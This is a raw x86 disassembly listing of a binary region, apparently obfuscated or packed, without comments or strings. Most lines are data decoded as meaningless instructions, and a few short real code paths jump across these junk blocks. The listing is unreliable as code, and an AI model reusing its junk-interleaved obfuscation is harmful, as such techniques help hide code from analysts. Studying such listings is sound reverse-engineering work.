  40aeac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aead:	sar    DWORD PTR [esi-0x7e],0xeb
  40aeb1:	sti    
  40aeb2:	cmp    ah,BYTE PTR [esi-0x167da618]
  40aeb8:	test   eax,0xfa079abd
  40aebd:	cmp    DWORD PTR [ebx+0x4f6e7bcc],ecx
  40aec3:	icebp  
  40aec4:	dec    edi
  40aec5:	push   es
  40aec6:	stos   BYTE PTR es:[edi],al
  40aec7:	ret    
  40aec8:	pop    eax
  40aec9:	out    0x6f,eax
  40aecb:	fs ins DWORD PTR es:[edi],dx
  40aecd:	mov    bh,BYTE PTR [eax+eax*4-0x26]
  40aed1:	lea    esi,ds:0x23e451e
  40aed7:	(bad)  
  40aed9:	sub    al,0x12
  40aedb:	fistp  WORD PTR [ecx]
  40aedd:	ror    DWORD PTR [eax-0x14471bcf],cl
  40aee3:	(bad)
  40aee6:	inc    esp
  40aee7:	mov    edx,0x8b8b3f78
  40aeec:	dec    ebp
  40aeed:	or     al,0x33
  40aeef:	(bad)  
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	sbb    edi,esi
  40af6b:	inc    ebx
  40af6c:	sub    DWORD PTR [esi-0x16],eax
  40af6f:	jo     0x40afe1
  40af71:	xchg   ebp,eax
  40af72:	jg     0x40afe4
  40af74:	jo     0x40afe0
  40af76:	lea    edx,[eax+0x1d]
  40af79:	add    ecx,DWORD PTR [edx]
  40af7b:	push   di
  40af7d:	shl    BYTE PTR [ebx-0x43b3bc67],cl
  40af83:	jnp    0x40afdb
  40af85:	ins    BYTE PTR es:[edi],dx
  40af86:	fcomp  QWORD PTR [ecx*2+0x7aaad745]
  40af8d:	fmul   DWORD PTR [edi]
  40af8f:	leave  
  40af90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af91:	mov    edi,DWORD PTR [ebx+0x36f04824]
  40af97:	out    0x8a,al
  40af99:	jle    0x40afb5
  40af9b:	dec    ebp
  40af9c:	sbb    al,0xca
  40af9e:	pusha  
  40af9f:	sbb    BYTE PTR [edi+0x30],bl
  40afa2:	je     0x40afae
  40afa4:	test   al,0xe6
  40afa6:	call   0x96f65bc5
  40afab:	dec    ecx
  40afac:	dec    edi
  40afad:	pop    ss
  40afae:	lds    ecx,FWORD PTR [ecx+0x2fd7d13b]
  40afb4:	sbb    eax,0xdf65e60b
  40afb9:	mov    ebx,0xffaf6809
  40afbe:	cwde   
  40afbf:	fnsave [ecx-0x363a3ef1]
  40afc5:	es dec ebp
  40afc7:	adc    ebx,ebp
  40afc9:	mov    ds:0x88144452,eax
  40afce:	push   0xe2fb388e
  40afd3:	ins    DWORD PTR es:[edi],dx
  40afd4:	out    0x9a,al
  40afd6:	(bad)  
  40afd7:	lods   eax,DWORD PTR ds:[esi]
  40afd8:	outs   dx,BYTE PTR ds:[esi]
  40afd9:	pop    eax
  40afda:	in     eax,dx
  40afdb:	das    
  40afdc:	pop    ds
  40afdd:	ret    
  40afde:	and    al,0xf4
  40afe0:	cmc    
  40afe1:	ins    BYTE PTR es:[edi],dx
  40afe2:	push   ss
  40afe3:	nop
  40afe4:	push   cs
  40afe5:	lahf   
  40afe6:	jae    0x40afa4
  40afe8:	repz dec edx
  40afea:	or     al,0x59
  40afec:	xlat   BYTE PTR ds:[ebx]
  40afed:	inc    eax
  40afee:	inc    edi
  40afef:	inc    edx
  40aff0:	dec    ecx
  40aff1:	mov    ds:0x6c645ca3,al
  40aff6:	lds    ebx,FWORD PTR ss:[esi+0x7a]
  40affa:	or     eax,0xe34973bd
  40afff:	mov    al,al
  40b001:	jb     0x40afca
  40b003:	test   DWORD PTR [ebp+0x67010a5c],ebx
  40b009:	xchg   esp,eax
  40b00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b00b:	add    DWORD PTR [esi+0x23],0xffffffec
  40b00f:	mov    ebx,0xc8263c71
  40b014:	sbb    esp,ecx
  40b016:	or     edi,DWORD PTR cs:[esi+0x7f]
  40b01a:	sbb    cl,BYTE PTR [eax*1+0x238d297b]
  40b021:	xor    ah,dl
  40b023:	pop    es
  40b024:	imul   esp,DWORD PTR [ebx+0x64268d04],0xc2448ec6
  40b02e:	push   ds
  40b02f:	mov    BYTE PTR [eax-0x67],al
  40b032:	sub    edx,DWORD PTR [ebx]
  40b034:	stc    
  40b035:	or     dl,BYTE PTR [ebx]
  40b037:	pop    ebx
  40b038:	clc    
  40b039:	call   0x3ad4:0x70e54a24
  40b040:	(bad)  
  40b042:	fadd   DWORD PTR cs:[edx+eax*4]
  40b046:	das    
  40b047:	dec    ecx
  40b048:	xchg   edi,eax
  40b049:	mov    ch,dl
  40b04b:	sub    eax,0x81cc029a
  40b050:	sbb    ecx,DWORD PTR [edx+0x434dc92a]
  40b056:	mov    esp,0xb090942f
  40b05b:	and    eax,0xa09c79d8
  40b060:	sub    ebx,DWORD PTR ds:[ecx+0x4deb0e11]
  40b067:	add    al,0xde
  40b069:	std    
  40b06a:	jp     0x40aff0
  40b06c:	adc    esi,DWORD PTR [ebx+0x1f7af87a]
  40b072:	mov    ds:0xce5d360e,eax
  40b077:	cmp    eax,0x8c3b92eb
  40b07c:	sub    al,0x43
  40b07e:	jbe    0x40b0d1
  40b080:	jmp    0x40b058
  40b082:	or     ch,BYTE PTR [edi-0x72c85437]
  40b088:	xor    DWORD PTR [ebx-0x1fbd7882],eax
  40b08e:	pop    ebx
  40b08f:	retf   0x4cc0
  40b092:	rcr    ch,0x26
  40b095:	mov    eax,ds:0x8266866f
  40b09a:	mov    ch,0xb5
  40b09c:	repnz sbb eax,DWORD PTR [edx-0x1a]
  40b0a0:	mov    bh,0xe6
  40b0a3:	cmp    ecx,ebx
  40b0a5:	or     eax,0xb908c211
  40b0aa:	cmp    ecx,DWORD PTR [esi+edx*2]
  40b0ad:	push   ebx
  40b0ae:	add    al,0xd4
  40b0b0:	bound  esp,QWORD PTR [ecx+0x3287cccb]
  40b0b6:	imul   eax,DWORD PTR [edx+0x1e],0x39
  40b0ba:	mov    ds:0x258b48bb,eax
  40b0bf:	push   esi
  40b0c0:	inc    eax
  40b0c1:	cmp    al,0x1f
  40b0c3:	adc    BYTE PTR [esi+0x168c304d],cl
  40b0c9:	mov    ds:0x23a95446,eax
  40b0ce:	(bad)  
  40b0cf:	std    
  40b0d0:	data16 (bad) 
  40b0d2:	jmp    0x40b087
  40b0d4:	mov    cl,0x9b
  40b0d6:	sbb    DWORD PTR [esi+0x51],esp
  40b0d9:	inc    eax
  40b0da:	fwait
  40b0db:	adc    BYTE PTR [ebx],bh
  40b0dd:	or     al,ch
  40b0df:	out    0xe,al
  40b0e1:	mov    ds:0x422b7cfa,eax
  40b0e6:	das    
  40b0e7:	adc    BYTE PTR [esp+ecx*4-0x1],ah
  40b0eb:	bound  eax,QWORD PTR es:[esi-0x8674307]
  40b0f2:	lods   eax,DWORD PTR ds:[esi]
  40b0f3:	lods   eax,DWORD PTR ds:[esi]
  40b0f4:	xchg   ecx,eax
  40b0f5:	mov    esi,0x5e9bccf0
  40b0fa:	aaa    
  40b0fb:	outs   dx,BYTE PTR ds:[esi]
  40b0fc:	push   0xcd78c055
  40b101:	fsubrp st(3),st
  40b103:	xlat   BYTE PTR ds:[ebx]
  40b104:	mov    edi,0xd12b90c4
  40b109:	ss xchg edx,eax
  40b10b:	inc    edi
  40b10c:	mov    dh,0x1d
  40b10e:	or     BYTE PTR [ebx-0x75],0x4d
  40b112:	call   0x8c38f6a2
  40b117:	add    BYTE PTR [ebx+0xc8d3c40],cl
  40b11d:	int    0x78
  40b11f:	add    BYTE PTR [eax],al
  40b121:	add    BYTE PTR [ebx],al
  40b123:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40b12a:	add    al,0x8
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	push   ebp
  40b148:	jp     0x40b135
  40b14a:	and    eax,0x7070e8db
  40b14f:	xchg   ebp,eax
  40b150:	jg     0x40b1c2
  40b152:	jo     0x40b0de
  40b154:	push   ds
  40b155:	outs   dx,DWORD PTR ds:[esi]
  40b156:	sub    al,0xee
  40b158:	ds push ds
  40b15a:	jge    0x40b194
  40b15c:	adc    ah,cl
  40b15e:	lods   al,BYTE PTR ds:[esi]
  40b15f:	jnp    0x40b18f
  40b161:	cmp    BYTE PTR [ebx-0x71],ch
  40b164:	dec    esp
  40b165:	xchg   esi,eax
  40b166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b167:	cwde   
  40b168:	lea    eax,[ecx+0x5d]
  40b16b:	div    dl
  40b16d:	sub    cl,cl
  40b16f:	mov    WORD PTR [esi+edi*8+0x566dfdab],fs
  40b176:	rcl    bh,cl
  40b178:	scas   al,BYTE PTR es:[edi]
  40b179:	loopne 0x40b1b3
  40b17b:	pop    edx
  40b17c:	ror    BYTE PTR [ebp+0x558053b9],1
  40b182:	int    0x6
  40b184:	imul   sp,WORD PTR ds:0xa01c4f9c,0x6ddf
  40b18d:	popf   
  40b18e:	(bad)  
  40b18f:	sub    al,dl
  40b191:	arpl   WORD PTR [eax+ebp*8-0x5d1119b9],ax
  40b198:	loop   0x40b11f
  40b19a:	jmp    0xd2f95530
  40b19f:	neg    BYTE PTR [edx+0x5853cf21]
  40b1a5:	stc    
  40b1a6:	test   al,ah
  40b1a8:	dec    edx
  40b1a9:	(bad)  
  40b1aa:	repnz repz xchg edx,edi
  40b1ae:	mov    ebx,ss
  40b1b0:	aaa    
  40b1b1:	(bad)  
  40b1b2:	jne    0x40b14c
  40b1b4:	push   edx
  40b1b5:	pop    cx
  40b1b7:	iret   
  40b1b8:	cmp    ecx,DWORD PTR [ebx-0x37]
  40b1bb:	xchg   ecx,eax
  40b1bc:	fwait
  40b1bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1be:	ret    0xb009
  40b1c1:	retf   
  40b1c2:	add    ebx,0xdb23c3b7
  40b1c8:	fcomp  QWORD PTR [ebp+0x44]
  40b1cb:	int3   
  40b1cc:	jnp    0x40b233
  40b1ce:	or     al,0x6c
  40b1d0:	xchg   ebx,eax
  40b1d1:	in     al,dx
  40b1d2:	mov    esi,0x3f19b0b7
  40b1d7:	adc    BYTE PTR [esi],ah
  40b1d9:	sub    esi,DWORD PTR [ecx-0x7]
  40b1dc:	out    dx,eax
  40b1dd:	xor    esp,esp
  40b1df:	pusha  
  40b1e0:	push   es
  40b1e1:	outs   dx,DWORD PTR ds:[esi]
  40b1e2:	data16 fwait
  40b1e4:	jmp    0xf9f23ecf
  40b1e9:	js     0x40b1bd
  40b1eb:	mov    BYTE PTR [eax],cl
  40b1ed:	dec    ebx
  40b1ee:	outs   dx,DWORD PTR ds:[esi]
  40b1ef:	fs mov ebp,0x6d95235e
  40b1f5:	xchg   DWORD PTR [eax],ebx
  40b1f7:	adc    dh,BYTE PTR [ecx]
  40b1f9:	and    BYTE PTR [ebx-0x59],dl
  40b1fc:	in     al,0xf4
  40b1fe:	push   edi
  40b1ff:	icebp  
  40b200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b201:	test   eax,0x83d72087
  40b206:	pop    esi
  40b207:	lods   al,BYTE PTR ds:[esi]
  40b208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b209:	pop    ecx
  40b20a:	add    al,0xb9
  40b20c:	in     eax,0xad
  40b20e:	mov    ah,0x46
  40b210:	stos   DWORD PTR es:[edi],eax
  40b211:	xor    al,0x8c
  40b213:	inc    edx
  40b214:	jo     0x40b1d0
  40b216:	call   edi
  40b218:	stc    
  40b219:	fdivr  QWORD PTR [edi-0x49cb468f]
  40b21f:	dec    dl
  40b221:	xor    al,0x6a
  40b223:	push   0x6c
  40b225:	or     DWORD PTR [ecx+0x595b5e7c],edx
  40b22b:	clc    
  40b22c:	jo     0x40b28d
  40b22e:	test   DWORD PTR [esi+0x316d0442],0x367e51b9
  40b238:	or     eax,0xe6574f27
  40b23d:	and    BYTE PTR ds:0xa028d391,bh
  40b243:	pop    edi
  40b244:	ins    BYTE PTR es:[edi],dx
  40b245:	sub    edx,ebp
  40b247:	mov    al,ch
  40b249:	adc    al,cl
  40b24b:	lock jl 0x40b290
  40b24e:	sti    
  40b24f:	pop    es
  40b250:	in     eax,dx
  40b251:	outs   dx,DWORD PTR ds:[esi]
  40b252:	inc    edi
  40b253:	jecxz  0x40b2a3
  40b255:	test   bh,dh
  40b257:	jne    0x40b270
  40b259:	cmp    edi,esp
  40b25b:	lea    esp,[edi+0x8cb26f0]
  40b261:	les    edi,FWORD PTR [eax]
  40b263:	out    0x18,eax
  40b265:	cmp    eax,0x4f30d9f
  40b26a:	int    0x4a
  40b26c:	dec    esi
  40b26d:	and    DWORD PTR [edi],0x6558283
  40b273:	ror    BYTE PTR [ebp+0x4cb72f55],1
  40b279:	and    esp,DWORD PTR [edx]
  40b27b:	sti    
  40b27c:	dec    ebp
  40b27d:	nop
  40b27e:	mov    edx,0x7198c6c6
  40b283:	jnp    0x40b2ac
  40b285:	sub    al,0x66
  40b287:	dec    edx
  40b288:	fcomi  st,st(5)
  40b28a:	mov    ah,0x80
  40b28c:	jl     0x40b2c0
  40b28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b28f:	ret    0x9f3d
  40b292:	add    BYTE PTR [eax+eax*2+0x34],dl
  40b296:	push   ss
  40b297:	jno    0x40b2fb
  40b299:	inc    edi
  40b29a:	lods   eax,DWORD PTR ds:[esi]
  40b29b:	mov    esi,edx
  40b29d:	(bad)  
  40b29e:	or     ah,BYTE PTR [eax+edi*1+0x4bf2eed7]
  40b2a5:	push   ebp
  40b2a6:	cwde   
  40b2a7:	mov    esp,0x6dfe0a2b
  40b2ac:	push   edx
  40b2ad:	in     al,dx
  40b2ae:	jl     0x40b295
  40b2b0:	mov    ch,0xc2
  40b2b2:	rcl    DWORD PTR [eax+0x757f2746],0x6
  40b2b9:	inc    ebp
  40b2ba:	test   DWORD PTR [esi],0x678c234
  40b2c0:	iret   
  40b2c1:	xchg   ebx,eax
  40b2c2:	or     bh,cl
  40b2c4:	ins    DWORD PTR es:[edi],dx
  40b2c5:	jmp    0x40b29f
  40b2c7:	inc    ebp
  40b2c8:	aas    
  40b2c9:	imul   esi,DWORD PTR [ebx],0xbf855c43
  40b2cf:	add    ch,cl
  40b2d1:	adc    DWORD PTR [ecx+0x3a],ebx
  40b2d4:	stos   DWORD PTR es:[edi],eax
  40b2d5:	add    al,0x9e
  40b2d7:	in     eax,0xf6
  40b2d9:	adc    bh,al
  40b2db:	daa    
  40b2dc:	pop    esi
  40b2dd:	shl    BYTE PTR [eax+0x13c956f1],0xfe
  40b2e4:	jecxz  0x40b300
  40b2e6:	test   BYTE PTR [ecx],dl
  40b2e8:	dec    esi
  40b2e9:	sub    BYTE PTR [ecx],0x92
  40b2ec:	xchg   ebp,eax
  40b2ed:	or     ecx,DWORD PTR [ecx-0x4c1623bb]
  40b2f3:	add    DWORD PTR [eax],eax
  40b2f5:	add    BYTE PTR [ecx+0x71e4f104],dh
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0x63dbadc9
  40b303:	cld    
  40b304:	push   cs
  40b305:	lock jo 0x40b2fe
  40b308:	jo     0x40b37a
  40b30a:	xchg   ebp,eax
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b301
  40b30f:	es gs repz xor al,0x1b
  40b314:	pop    ds
  40b315:	int    0xe6
  40b317:	loop   0x40b2f2
  40b319:	ret    0x34f9
  40b31c:	push   eax
  40b31d:	sbb    al,BYTE PTR [edx-0x8]
  40b320:	xor    bh,dh
  40b322:	fiadd  WORD PTR [edi-0x1ab258ee]
  40b328:	push   cs
  40b329:	or     BYTE PTR [ecx],ch
  40b32b:	(bad)  [ebp+0x7f693b0d]
  40b331:	cmc    
  40b332:	ficomp WORD PTR [ebx-0x1369c2ba]
  40b338:	push   ss
  40b339:	jmp    0x75d7:0x3b061581
  40b340:	test   DWORD PTR fs:[ecx+0x3a1cac41],ecx
  40b347:	push   ecx
  40b348:	xor    eax,0x379a13a0
  40b34d:	dec    edi
  40b34e:	pop    esp
  40b34f:	mov    ebp,0xf1a77665
  40b354:	mov    dl,0x8a
  40b356:	test   ah,bh
  40b358:	push   edx
  40b359:	push   edx
  40b35a:	adc    BYTE PTR [ecx+0x4b],ah
  40b35d:	xchg   esp,eax
  40b35e:	sbb    dh,BYTE PTR [edx-0x59]
  40b361:	arpl   WORD PTR [esi+0x6d77a244],si
  40b367:	push   es
  40b368:	cwde   
  40b369:	mov    cl,bl
  40b36b:	fnstcw WORD PTR [esi+edx*8+0x625bc771]
  40b372:	inc    esi
  40b373:	pushf  
  40b374:	adc    eax,0x7716d3b1
  40b379:	dec    ebp
  40b37a:	pop    esi
  40b37b:	xchg   edi,eax
  40b37c:	outs   dx,DWORD PTR ds:[esi]
  40b37d:	adc    dh,BYTE PTR [ebx]
  40b37f:	ret    
  40b380:	lahf   
  40b381:	add    DWORD PTR [esi-0x22],edi
  40b384:	inc    ecx
  40b385:	mov    al,ds:0xacce07b9
  40b38a:	scas   eax,DWORD PTR es:[edi]
  40b38b:	nop
  40b38c:	jns    0x40b360
  40b38e:	dec    edi
  40b38f:	in     al,0x30
  40b391:	or     ah,BYTE PTR [esi+edx*2+0x1e544b54]
  40b398:	fild   WORD PTR [ecx+0x268ed40c]
  40b39e:	fwait
  40b39f:	retf   0x8e36
  40b3a2:	or     BYTE PTR [edi-0x5b806940],bl
  40b3a8:	out    0xef,eax
  40b3aa:	mov    eax,0x210aeba1
  40b3af:	jbe    0x40b40f
  40b3b1:	or     al,0x93
  40b3b3:	popa   
  40b3b4:	aas    
  40b3b5:	or     DWORD PTR [eax-0x2328f313],esi
  40b3bb:	scas   al,BYTE PTR es:[edi]
  40b3bc:	xchg   esi,eax
  40b3bd:	sahf   
  40b3be:	cmc    
  40b3bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3c0:	(bad)  
  40b3c2:	inc    esp
  40b3c3:	call   DWORD PTR [edx]
  40b3c5:	mov    esi,0x733e0f75
  40b3ca:	adc    BYTE PTR [eax+esi*4-0x31db0cbe],0xcc
  40b3d2:	call   0x6acf:0xcbb6960d
  40b3d9:	cmp    ah,BYTE PTR [ecx+0x40]
  40b3dc:	xchg   edi,eax
  40b3dd:	sbb    dl,BYTE PTR [esi-0x6e72be7f]
  40b3e3:	call   0x2e22:0x66384bc5
  40b3ea:	test   eax,0xa93f4680
  40b3ef:	(bad)  
  40b3f0:	fucomp st(5)
  40b3f2:	cmp    al,0xa3
  40b3f4:	mov    ah,0x91
  40b3f6:	xlat   BYTE PTR ds:[ebx]
  40b3f7:	or     cl,bl
  40b3f9:	enter  0xdb1d,0x5c
  40b3fd:	test   al,0x91
  40b3ff:	jns    0x40b45b
  40b401:	push   edx
  40b402:	mov    al,ds:0xb2b146a7
  40b407:	or     al,0x17
  40b409:	inc    esp
  40b40a:	jo     0x40b397
  40b40c:	xlat   BYTE PTR ds:[ebx]
  40b40d:	sbb    BYTE PTR [esi+esi*1],cl
  40b410:	sub    esp,DWORD PTR [ebp+0x7d3f2a48]
  40b416:	retf   
  40b417:	shl    DWORD PTR [ecx],cl
  40b419:	fnstcw WORD PTR [edi-0x337eba12]
  40b41f:	push   0x43
  40b421:	add    DWORD PTR [esi],esp
  40b423:	gs jno 0x40b442
  40b426:	xchg   edx,eax
  40b427:	jp     0x40b445
  40b429:	or     BYTE PTR [eax+0x7a],0x19
  40b42d:	mov    ch,0x9
  40b42f:	fadd   DWORD PTR [edi-0x46dd05e]
  40b435:	inc    ebx
  40b436:	shr    BYTE PTR [edi+0xf],cl
  40b439:	mov    ebp,0xeec8d0e8
  40b43e:	xlat   BYTE PTR ds:[ebx]
  40b43f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b440:	aad    0xeb
  40b442:	mov    BYTE PTR [ebp+0x1d],ch
  40b445:	pop    ebp
  40b446:	push   ebp
  40b447:	in     eax,0x58
  40b449:	sbb    esp,DWORD PTR [esi+0x6c]
  40b44c:	cmc    
  40b44d:	push   0x25
  40b44f:	push   es
  40b450:	dec    ecx
  40b451:	test   al,0xf1
  40b453:	mov    bl,0xd9
  40b455:	imul   DWORD PTR ds:0x77888a8b
  40b45b:	pop    ss
  40b45c:	add    DWORD PTR [ecx+0x56],0x5b
  40b460:	or     BYTE PTR [ecx+0x13],ah
  40b463:	std    
  40b464:	stc    
  40b465:	(bad)  
  40b466:	sbb    DWORD PTR [ebx-0x47],edx
  40b469:	push   ebx
  40b46a:	adc    ch,BYTE PTR [ecx+0x3ab84b05]
  40b470:	mov    ah,0x9e
  40b472:	out    dx,al
  40b473:	retf   0x621b
  40b476:	rcr    BYTE PTR [edi],cl
  40b478:	pop    esi
  40b479:	adc    DWORD PTR [ebx+0x66c50f5e],0xffffff9e
  40b480:	ror    DWORD PTR [edi+0x7a],1
  40b483:	adc    esp,DWORD PTR [esi]
  40b485:	pop    ecx
  40b486:	mov    cl,0x0
  40b488:	iret   
  40b489:	lock sahf 
  40b48b:	xchg   BYTE PTR [ecx+0x1b],ah
  40b48e:	loop   0x40b43f
  40b490:	or     ecx,edx
  40b492:	sbb    DWORD PTR [eax-0x508b81d9],edi
  40b498:	enter  0x68f4,0xf0
  40b49c:	jo     0x40b519
  40b49e:	into   
  40b49f:	int3   
  40b4a0:	mov    esp,ecx
  40b4a2:	scas   al,BYTE PTR es:[edi]
  40b4a3:	adc    DWORD PTR [ebp+0x50],esi
  40b4a6:	or     cl,BYTE PTR [ebp+0x8458bae]
  40b4ac:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4af:	xor    eax,esi
  40b4b1:	add    eax,edi
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0x35413075
  40b4de:	(bad)  
  40b4df:	jge    0x40b492
  40b4e1:	xchg   ebp,eax
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b54d
  40b4ea:	pop    ebp
  40b4eb:	(bad)  
  40b4ec:	in     al,0x30
  40b4ee:	push   esp
  40b4ef:	xor    DWORD PTR [eax-0x592477b3],esi
  40b4f5:	add    bh,dh
  40b4f7:	outs   dx,BYTE PTR ds:[esi]
  40b4f8:	adc    DWORD PTR [esi],ebp
  40b4fa:	jl     0x40b569
  40b4fc:	and    DWORD PTR [edx-0x6b99a6fd],ebx
  40b502:	jne    0x40b578
  40b504:	dec    esp
  40b505:	mov    bh,0xd4
  40b507:	dec    ebx
  40b508:	rol    al,cl
  40b50a:	push   ebp
  40b50b:	stos   DWORD PTR es:[edi],eax
  40b50c:	sbb    BYTE PTR [ebx+ebx*2+0x17],al
  40b510:	loop   0x40b567
  40b512:	test   DWORD PTR [ebx-0x41581fab],esp
  40b518:	and    DWORD PTR [ecx+0x14],ebx
  40b51b:	add    eax,0x2151ea28
  40b520:	mov    BYTE PTR [esi+0xa],bh
  40b523:	(bad)  
  40b525:	adc    dh,BYTE PTR [eax-0x589fe611]
  40b52b:	inc    edi
  40b52c:	repnz push ecx
  40b52e:	(bad)  
  40b52f:	mov    esi,0xd6a5289a
  40b534:	xchg   BYTE PTR [ebx],cl
  40b536:	add    DWORD PTR [ebx-0x53],eax
  40b539:	dec    ebx
  40b53a:	push   ecx
  40b53b:	pop    esi
  40b53c:	js     0x40b524
  40b53e:	ins    DWORD PTR es:[edi],dx
  40b53f:	lahf   
  40b540:	aam    0x8
  40b542:	sub    al,0xf4
  40b544:	rcl    BYTE PTR [ebp+0x7f],1
  40b547:	test   al,0x67
  40b549:	ret    0x8eb
  40b54c:	pop    esp
  40b54d:	inc    edi
  40b54e:	push   ss
  40b54f:	add    cl,BYTE PTR [edi+edx*2+0x3914e2be]
  40b556:	mov    edx,0xa9f75b32
  40b55b:	pop    eax
  40b55c:	dec    ebp
  40b55d:	jo     0x40b511
  40b55f:	xchg   ebx,eax
  40b560:	and    cl,bl
  40b562:	test   esp,eax
  40b564:	fst    DWORD PTR [edx]
  40b566:	and    DWORD PTR [eax-0x3],0xfffffffe
  40b56a:	jecxz  0x40b539
  40b56c:	jo     0x40b51e
  40b56e:	(bad)
  40b571:	test   al,0xa4
  40b573:	sbb    eax,DWORD PTR [edx-0x6f0d4059]
  40b579:	inc    edx
  40b57a:	clc    
  40b57b:	push   eax
  40b57c:	push   0xbeb22c2a
  40b581:	or     BYTE PTR [ebx],al
  40b583:	ret    
  40b584:	xchg   edx,eax
  40b585:	mov    ch,0x64
  40b587:	hlt    
  40b588:	(bad)  
  40b58a:	call   0xdd7d72b8
  40b58f:	pop    edi
  40b590:	das    
  40b591:	jg     0x40b535
  40b593:	daa    
  40b594:	push   ebx
  40b595:	and    eax,0x8e718286
  40b59a:	mov    WORD PTR [edx-0x25e6d82b],ss
  40b5a0:	daa    
  40b5a1:	addr16 push ebx
  40b5a3:	jle    0x40b5ef
  40b5a5:	loop   0x40b5ee
  40b5a7:	loop   0x40b543
  40b5a9:	in     al,dx
  40b5aa:	pop    ds
  40b5ab:	lock pop es
  40b5ad:	add    ah,BYTE PTR [edx-0x6d]
  40b5b0:	lods   al,BYTE PTR ds:[esi]
  40b5b1:	dec    ecx
  40b5b2:	mov    WORD PTR [edi],ds
  40b5b4:	cmp    edi,DWORD PTR [edi+0xd]
  40b5b7:	fisub  WORD PTR [ebp+0x47955004]
  40b5bd:	jbe    0x40b61d
  40b5bf:	jb     0x40b56f
  40b5c1:	cmp    BYTE PTR [eax-0x124645b],ah
  40b5c7:	add    bh,BYTE PTR [esi-0x3ef269aa]
  40b5cd:	mov    dh,0x67
  40b5cf:	fmul   st,st(3)
  40b5d1:	cwde   
  40b5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5d3:	clc    
  40b5d4:	cmp    al,0x18
  40b5d6:	dec    eax
  40b5d7:	cdq    
  40b5d8:	ins    DWORD PTR es:[edi],dx
  40b5d9:	inc    esi
  40b5da:	pop    edx
  40b5db:	sbb    dh,BYTE PTR [ebp-0x13ac0151]
  40b5e1:	mov    eax,0x8137b713
  40b5e6:	add    eax,0x3ac33a39
  40b5eb:	pop    esi
  40b5ec:	mov    ebx,DWORD PTR [edx]
  40b5ee:	cwde   
  40b5ef:	xchg   edi,eax
  40b5f0:	and    BYTE PTR [ebp+0x66389cf5],cl
  40b5f6:	xchg   cl,ah
  40b5f8:	sahf   
  40b5f9:	retf   0xa157
  40b5fc:	jmp    0x1a65:0xd354f4d2
  40b603:	mov    ebp,0xa618f3aa
  40b608:	imul   esp,DWORD PTR [edx-0xd],0x5dffb7a1
  40b60f:	mov    DWORD PTR [ebp+0x2bd57818],esp
  40b615:	jns    0x40b5ae
  40b617:	or     al,0xeb
  40b619:	adc    DWORD PTR [edx+eax*2],edi
  40b61c:	mov    cl,0x8b
  40b61e:	or     bh,bl
  40b620:	loopne 0x40b638
  40b622:	xlat   BYTE PTR ds:[ebx]
  40b623:	and    cl,BYTE PTR [ebp+ebx*2-0x481e23e3]
  40b62a:	out    0x1d,eax
  40b62c:	xchg   edx,eax
  40b62d:	sub    edx,ebx
  40b62f:	je     0x40b639
  40b631:	imul   BYTE PTR [ebp-0x79]
